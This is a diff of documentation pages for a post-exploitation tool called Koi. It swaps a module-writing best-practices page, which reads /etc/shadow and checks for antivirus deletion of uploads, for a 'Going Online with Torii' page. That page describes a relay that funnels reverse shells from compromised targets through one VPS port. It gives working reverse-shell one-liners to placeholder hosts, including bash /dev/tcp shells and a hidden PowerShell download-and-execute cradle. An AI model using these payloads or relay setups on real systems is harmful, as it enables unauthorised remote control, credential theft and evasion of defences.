@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/modules-best-practices/">
+        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/go-online/">
       
       
-        <link rel="prev" href="../modules-ui/">
+        <link rel="prev" href="../modules-best-practices/">
       
       
-        <link rel="next" href="../go-online/">
+        <link rel="next" href="../troubleshooting/">
       
       
         
@@ -25,7 +25,7 @@
     
     
       
-        <title>Best Practices - Koi Documentation</title>
+        <title>Going Online (Torii) - Koi Documentation</title>
       
     
     
@@ -78,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#module-development-best-practices" class="md-skip">
+        <a href="#going-online-with-torii" class="md-skip">
           Skip to content
         </a>
       
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Best Practices
+              Going Online (Torii)
             
           </span>
         </div>
@@ -535,20 +535,18 @@
       
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
@@ -569,7 +567,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -696,6 +694,41 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../modules-best-practices/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Best Practices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
     
   
   
@@ -715,7 +748,7 @@
   <span class="md-ellipsis">
     
   
-    Best Practices
+    Going Online (Torii)
   
 
     
@@ -733,7 +766,7 @@
   <span class="md-ellipsis">
     
   
-    Best Practices
+    Going Online (Torii)
   
 
     
@@ -759,10 +792,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#error-handling" class="md-nav__link">
+  <a href="#why-you-need-it" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Error Handling
+        Why You Need It
       
     </span>
   </a>
@@ -770,10 +803,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#post-upload-verification" class="md-nav__link">
+  <a href="#how-it-works" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Post-upload Verification
+        How It Works
       
     </span>
   </a>
@@ -781,10 +814,60 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#remote-workspace-cleanup" class="md-nav__link">
+  <a href="#where-to-use-it" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Remote Workspace Cleanup
+        Where to Use It
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Where to Use It">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#local-network-optional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local Network (Optional)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-target-recommended" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Target (Recommended)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vps-deployment-recommended" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VPS Deployment (Recommended)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-is-torii" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Is Torii?
       
     </span>
   </a>
@@ -792,10 +875,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#windows-sessions" class="md-nav__link">
+  <a href="#quick-start" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Windows Sessions
+        Quick Start
       
     </span>
   </a>
@@ -803,10 +886,82 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#checklist" class="md-nav__link">
+  <a href="#setup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Checklist
+        Setup
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-check-your-koi-side-channel-ports" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Check your Koi side-channel ports
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-deploy-torii-on-your-vps-or-relay-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Deploy Torii on your VPS or relay machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-run-koi-on-the-same-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Run Koi on the same machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-create-a-torii-payload-manually" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Create a Torii payload manually
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerShell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#download" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Download
       
     </span>
   </a>
@@ -817,41 +972,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../go-online/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Going Online (Torii)
-  
-
-    
-  </span>
-  
-  
-
-      </a>
     </li>
   
 
@@ -964,10 +1084,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#error-handling" class="md-nav__link">
+  <a href="#why-you-need-it" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Error Handling
+        Why You Need It
       
     </span>
   </a>
@@ -975,10 +1095,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#post-upload-verification" class="md-nav__link">
+  <a href="#how-it-works" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Post-upload Verification
+        How It Works
       
     </span>
   </a>
@@ -986,10 +1106,60 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#remote-workspace-cleanup" class="md-nav__link">
+  <a href="#where-to-use-it" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Remote Workspace Cleanup
+        Where to Use It
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Where to Use It">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#local-network-optional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local Network (Optional)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-target-recommended" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Target (Recommended)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vps-deployment-recommended" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VPS Deployment (Recommended)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-is-torii" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Is Torii?
       
     </span>
   </a>
@@ -997,10 +1167,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#windows-sessions" class="md-nav__link">
+  <a href="#quick-start" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Windows Sessions
+        Quick Start
       
     </span>
   </a>
@@ -1008,10 +1178,82 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#checklist" class="md-nav__link">
+  <a href="#setup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Checklist
+        Setup
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-check-your-koi-side-channel-ports" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Check your Koi side-channel ports
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-deploy-torii-on-your-vps-or-relay-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Deploy Torii on your VPS or relay machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-run-koi-on-the-same-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Run Koi on the same machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-create-a-torii-payload-manually" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Create a Torii payload manually
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerShell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#download" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Download
       
     </span>
   </a>
@@ -1035,87 +1277,122 @@
 
 
 
-<h1 id="module-development-best-practices">Module Development - Best Practices</h1>
-<hr />
-<h2 id="error-handling">Error Handling</h2>
-<p>Always call <code>self.err(msg)</code> and <strong><code>return</code> immediately</strong> - never continue after an error.</p>
-<div class="highlight"><pre><span></span><code><span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/shadow&quot;</span><span class="p">)</span>
-<span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">success</span><span class="p">:</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Could not read /etc/shadow (rc=</span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">returncode</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
-    <span class="k">return</span>
+<h1 id="going-online-with-torii">Going Online with Torii</h1>
+<h2 id="why-you-need-it">Why You Need It</h2>
+<p>Koi is built to run locally on a compromised machine. When a payload connects back, it opens a session on 127.0.0.1:4010. This is great when you're already inside a network (pivoting). But Koi also uses side-channel ports for file transfers and module operations.</p>
+<p>Check your Koi config to see which ports:</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>~/.koi/config.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span>sidetcps
 </code></pre></div>
-<p>Wrap network calls in <code>try/except</code> and surface the exception:</p>
-<div class="highlight"><pre><span></span><code><span class="k">with</span> <span class="bp">self</span><span class="o">.</span><span class="n">spinner</span><span class="p">(</span><span class="s2">&quot;Fetching release info...&quot;</span><span class="p">):</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Download failed: </span><span class="si">{</span><span class="n">exc</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-        <span class="k">return</span>
+<p>By default that's ports 4011-4015, but it can be more or different depending on your config.</p>
+<p>When you go remote or deploy on a VPS, you have a problem. You'd need to open firewall rules for:
+- Port 4010 for the reverse shell
+- Ports 4011-4015 for side-channels (or whatever your config says)</p>
+<p>Your options suck:
+- Open all those ports individually (obvious what it is)
+- Dynamically update firewall rules (too complex)
+- Change Koi's config for each deployment (messy)</p>
+<p>I wrote a little script (torii, hehe) that multiplexes all of this through a single TCP port instead. That's it.</p>
+<hr />
+<h2 id="how-it-works">How It Works</h2>
+<p>Torii sits between your target and Koi. When a target connects, it sends a 3-byte header that tells Torii where to route the traffic:</p>
+<div class="highlight"><pre><span></span><code>[TYPE byte][PORT in big-endian]
+
+0x01 0x0F 0xAA = reverse shell to Koi:4010
+0x02 0x0F 0xAB = side-channel to Koi:4011
 </code></pre></div>
+<p>When Koi needs to send a file transfer command, it tells the target to connect back. Torii intercepts that and rewrites the localhost address to your public IP, then routes it to the right internal port. The target has no idea it's being multiplexed.</p>
+<p>Result: everything flows through one port instead of many.</p>
 <hr />
-<h2 id="post-upload-verification">Post-upload Verification</h2>
-<p>AV/EDR may silently delete a binary after it lands on disk. Always verify.</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># Linux</span>
-<span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;test -s </span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2"> &amp;&amp; echo OK || echo MISS&quot;</span><span class="p">)</span>
-<span class="k">if</span> <span class="s2">&quot;OK&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">:</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="s2">&quot;File missing after upload.&quot;</span><span class="p">)</span>
-    <span class="k">return</span>
-<span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;chmod +x </span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-
-<span class="c1"># Windows</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>   <span class="c1"># give AV time to act</span>
-<span class="n">check</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_win_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;(Test-Path &#39;</span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2">&#39;).ToString()&quot;</span><span class="p">)</span>
-<span class="k">if</span> <span class="n">check</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;true&quot;</span><span class="p">:</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="s2">&quot;File not present after upload, likely removed by AV.&quot;</span><span class="p">)</span>
-    <span class="k">return</span>
+<h2 id="where-to-use-it">Where to Use It</h2>
+<h3 id="local-network-optional">Local Network (Optional)</h3>
+<p>If you're already pivoted inside, Koi works fine without Torii. But you could still use it for centralization, easier deployment, or just for practice.</p>
+<h3 id="remote-target-recommended">Remote Target (Recommended)</h3>
+<p>Target is outside your network. Instead of opening multiple firewall holes:</p>
+<div class="highlight"><pre><span></span><code>Without Torii: port 4010, then 4011, 4012, 4013, 4014, 4015
+With Torii:    port 49410 only
 </code></pre></div>
+<p>One firewall rule. Done.</p>
+<h3 id="vps-deployment-recommended">VPS Deployment (Recommended)</h3>
+<p>Same as remote. You don't want multiple Koi ports exposed on your VPS. Torii lets Koi stay hidden on localhost while you only open a single relay port.</p>
 <hr />
-<h2 id="remote-workspace-cleanup">Remote Workspace Cleanup</h2>
-<p>If your module creates a temporary directory on the target, implement <code>_cleanup()</code> and call it on both success and early exit.</p>
-<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="n">work</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;.</span><span class="se">\\</span><span class="s2">sh_</span><span class="si">{</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">_win_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;New-Item -ItemType Directory -Path &#39;</span><span class="si">{</span><span class="n">work</span><span class="si">}</span><span class="s2">&#39; -Force | Out-Null&quot;</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_upload_bytes</span><span class="p">(</span><span class="n">raw</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">work</span><span class="si">}</span><span class="se">\\</span><span class="s2">tool.exe&quot;</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="s2">&quot;Upload failed.&quot;</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">_cleanup</span><span class="p">(</span><span class="n">work</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="c1"># ... rest of the logic ...</span>
-
-    <span class="bp">self</span><span class="o">.</span><span class="n">_cleanup</span><span class="p">(</span><span class="n">work</span><span class="p">)</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;Done.&quot;</span><span class="p">)</span>
-
-<span class="k">def</span><span class="w"> </span><span class="nf">_cleanup</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">work_dir</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">_win_query</span><span class="p">(</span>
-            <span class="sa">f</span><span class="s2">&quot;Remove-Item -Recurse -Force &#39;</span><span class="si">{</span><span class="n">work_dir</span><span class="si">}</span><span class="s2">&#39; -ErrorAction SilentlyContinue&quot;</span>
-        <span class="p">)</span>
-    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
-        <span class="k">pass</span>
+<h2 id="what-is-torii">What Is Torii?</h2>
+<p>It's a single-file Python script (about 1000 lines). No external dependencies. It reads that 3-byte header, looks up where to route, and forwards the connection. When Koi sends commands that embed localhost addresses, Torii rewrites them to your public IP on the fly.</p>
+<p>Features:
+- All traffic through one port
+- No dependencies, no installation
+- Transparent address rewriting for file transfers
+- Tracks multiple targets by their IP</p>
+<p>Deploy it like this:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>torii_standalone.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--listen<span class="w"> </span><span class="m">0</span>.0.0.0:49410<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--koi<span class="w"> </span><span class="m">127</span>.0.0.1:4010<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--public-host<span class="w"> </span>YOUR_PUBLIC_IP
 </code></pre></div>
+<p>Koi stays on localhost. Targets connect through Torii. No configuration changes to Koi itself.</p>
 <hr />
-<h2 id="windows-sessions">Windows Sessions</h2>
-<ul>
-<li>Always use <code>_win_query</code> for commands that return output. Never use <code>exec</code> on Windows.</li>
-<li>Always use <code>_dispatch_ps</code> to send fire-and-forget PS commands. Never call <code>session.conn.sendall()</code> directly.</li>
-<li>Always use <code>_upload_bytes</code> for uploads. Never reimplement the TCP transfer.</li>
-<li><code>_win_query</code> expressions must be <strong>single expressions</strong> with no top-level <code>;</code>. Use pipes instead of variable assignments at the outer level.</li>
-<li>Upgraded (ConPtyShell) sessions return larger, more reliable results. Warn users if accuracy matters and the session is not upgraded.</li>
-</ul>
+<h2 id="quick-start">Quick Start</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># On your VPS or relay machine or even yourself (with a port 49410 open)</span>
+python3<span class="w"> </span>torii_standalone.py<span class="w"> </span>--listen<span class="w"> </span><span class="m">0</span>.0.0.0:49410<span class="w"> </span>--koi<span class="w"> </span><span class="m">127</span>.0.0.1:4010<span class="w"> </span>--public-host<span class="w"> </span>YOUR_PUBLIC_IP
+
+<span class="c1"># On the same machine, in another terminal (or just koi if you use the default settings)</span>
+koi<span class="w"> </span>--listen<span class="w"> </span><span class="m">127</span>.0.0.1:4010
+</code></pre></div>
+<p>That's it. Targets connect to <code>YOUR_PUBLIC_IP:49410</code>, everything routes internally to Koi.</p>
 <hr />
-<h2 id="checklist">Checklist</h2>
-<ul>
-<li>[ ] Class inherits from <code>KoiModule</code>, file is in <code>src/koi/modules/</code></li>
-<li>[ ] <code>name</code>, <code>description</code>, and <code>platform</code> are set correctly</li>
-<li>[ ] <code>run()</code> is implemented, no logic in <code>__init__</code></li>
-<li>[ ] <code>exec()</code> only called on Linux; <code>_win_query()</code> for Windows</li>
-<li>[ ] File uploads use <code>self._upload_bytes()</code> - not a manual reimplementation</li>
-<li>[ ] Arbitrary PS commands use <code>self._dispatch_ps()</code></li>
-<li>[ ] Every error path calls <code>self.err()</code> and <code>return</code></li>
-<li>[ ] Remote temp workspaces are cleaned up on both success and failure</li>
-<li>[ ] Post-upload file existence is verified before continuing</li>
-</ul>
+<h2 id="setup">Setup</h2>
+<h3 id="1-check-your-koi-side-channel-ports">1. Check your Koi side-channel ports</h3>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>~/.koi/config.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span>sidetcps
+</code></pre></div>
+<p>You'll see a list like <code>[4011, 4012, 4013, 4014, 4015]</code>. You need to know these for calculating Torii headers.</p>
+<h3 id="2-deploy-torii-on-your-vps-or-relay-machine">2. Deploy Torii on your VPS or relay machine</h3>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>torii_standalone.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--listen<span class="w"> </span><span class="m">0</span>.0.0.0:49410<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--koi<span class="w"> </span><span class="m">127</span>.0.0.1:4010<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--public-host<span class="w"> </span>YOUR_PUBLIC_IP
+</code></pre></div>
+<p>Replace <code>YOUR_PUBLIC_IP</code> with the actual IP your targets can reach.</p>
+<h3 id="3-run-koi-on-the-same-machine">3. Run Koi on the same machine</h3>
+<div class="highlight"><pre><span></span><code>koi<span class="w"> </span>--listen<span class="w"> </span><span class="m">127</span>.0.0.1:4010
+</code></pre></div>
+<p>It stays on localhost. Torii relays everything from the outside.</p>
+<h3 id="4-create-a-torii-payload-manually">4. Create a Torii payload manually</h3>
+<p>Koi doesn't generate Torii payloads automatically. You create them yourself by prepending the Torii header to a standard reverse shell.</p>
+<p>First, get a regular bash payload from Koi:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>koi<span class="w"> </span>payload
+<span class="o">[</span>?<span class="o">]</span><span class="w"> </span>Interface:<span class="w"> </span>eth0
+bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_IP/4010<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>Then wrap it with the Torii header. For a reverse shell on port 4010, the header is <code>0x01 0x0F 0xAA</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x01\x0f\xaa&#39;</span><span class="p">;</span><span class="w"> </span>bash<span class="w"> </span>-i<span class="o">)</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_PUBLIC_IP/49410<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>The <code>printf '\x01\x0f\xaa'</code> sends the header bytes. After that, everything else is normal bash reverse shell. When the target connects, Torii reads those three bytes, sees it's a shell connection to port 4010, and routes to Koi.</p>
+<p>If you need a different backend port (say, 4011 for a side-channel), calculate the header:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Port 4011 in hex = 0x0F 0xAB</span>
+<span class="c1"># Type 0x02 = side-channel</span>
+<span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x02\x0f\xab&#39;</span><span class="p">;</span><span class="w"> </span>your_payload_here<span class="o">)</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_PUBLIC_IP/49410<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>That's all. Deploy the payload on the target, it connects through Torii, you get a session in Koi.</p>
+<h3 id="powershell">PowerShell</h3>
+<p>For Windows targets, PowerShell is trickier because you need to send raw bytes. Use a bash wrapper:</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x01\x0f\xaa&#39;</span><span class="p">;</span><span class="w"> </span>powershell<span class="w"> </span>-nop<span class="w"> </span>-w<span class="w"> </span>hidden<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://YOUR_IP/payload.ps1&#39;)&quot;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_PUBLIC_IP/49410<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>The bash part sends the header first, then PowerShell runs. PowerShell receives commands from stdin and executes them.</p>
+<p>If you need pure PowerShell without bash, use TcpClient directly:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">(</span><span class="s1">&#39;YOUR_PUBLIC_IP&#39;</span><span class="p">,</span> <span class="n">49410</span><span class="p">)</span>
+<span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">()</span>
+<span class="no">[byte[]]</span><span class="nv">$header</span> <span class="p">=</span> <span class="p">@(</span><span class="n">0x01</span><span class="p">,</span> <span class="n">0x0f</span><span class="p">,</span> <span class="n">0xaa</span><span class="p">)</span>
+<span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="n">3</span><span class="p">)</span>
+<span class="c"># Now your reverse shell or payload</span>
+<span class="nv">$proc</span> <span class="p">=</span> <span class="no">[Diagnostics.Process]</span><span class="p">::</span><span class="n">Start</span><span class="p">(</span><span class="s1">&#39;powershell.exe&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p>The bash wrapper approach is usually simpler.</p>
+<hr />
+<h2 id="download">Download</h2>
+<p>Torii is included in the Koi repo or can be downloaded standalone:</p>
+<p><a href="../assets/dowloads/torii.py">Download torii_standalone.py</a></p>
+<p>That's it. No pip install, no dependencies. Just run it.</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>torii_standalone.py<span class="w"> </span>--help
+</code></pre></div>
 
 
 
